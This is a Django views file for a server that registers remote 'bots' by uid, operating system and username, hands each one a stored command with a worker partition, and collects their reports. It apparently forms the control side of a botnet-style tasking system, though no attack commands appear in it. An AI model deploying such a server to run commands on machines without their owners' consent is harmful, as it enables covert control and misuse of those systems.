from django.db.models import F
from django.utils.decorators import method_decorator
from django.views import View
from django.http import HttpResponse, JsonResponse
from django.utils import timezone
from django.views.decorators.csrf import csrf_exempt

from bots.auth import bot_authentication
from bots.models import Bot, Task, Report


@method_decorator(csrf_exempt, name='dispatch')
class AuthView(View):

    def post(self, request):
        uid = request.POST.get("uid")
        os = request.POST.get("os")
        username = request.POST.get("user")

        if not (uid and os and username):
            return HttpResponse(status=400)

        state = "Just authenticated"
        Bot.objects.create(uuid=uid, os=os, username=username, last_connection=timezone.now(), current_state=state)
        return HttpResponse(status=204)


class TaskView(View):

    @method_decorator(bot_authentication)
    def get(self, request):
        try:
            task = Task.objects.filter(workers_running__lt=F("total_workers")).latest("created_at")
        except Task.DoesNotExist:
            task = None

        if request.bot.current_state == "Running task":
            return JsonResponse({}, status=200)

        if not task:
            request.bot.current_state = "Waiting for task"
            request.bot.save()
            return JsonResponse({}, status=200)

        task.workers_running += 1
        command = task.command.strip() + " -p {}/{}".format(task.workers_running, task.total_workers)
        task.save()

        request.bot.current_state = "Running task"
        request.bot.save()

        return JsonResponse({"task_id": task.uuid, "command": command}, status=200)


@method_decorator(csrf_exempt, name='dispatch')
class DeliveryView(View):

    @method_decorator(bot_authentication)
    def post(self, request):
        task_id = request.POST.get("task_id")
        answer = request.POST.get("answer")

        if not (task_id and answer):
            return HttpResponse(status=400)

        task = Task.objects.filter(uuid=task_id).first()
        if not task:
            return HttpResponse(status=403)

        Report.objects.create(task=task, bot=request.bot, data=answer)
        return HttpResponse(status=204)


@method_decorator(csrf_exempt, name='dispatch')
class FinishedView(View):

    @method_decorator(bot_authentication)
    def get(self, request):
        request.bot.current_state = "Waiting for task"
        request.bot.save()
        return HttpResponse(status=204)
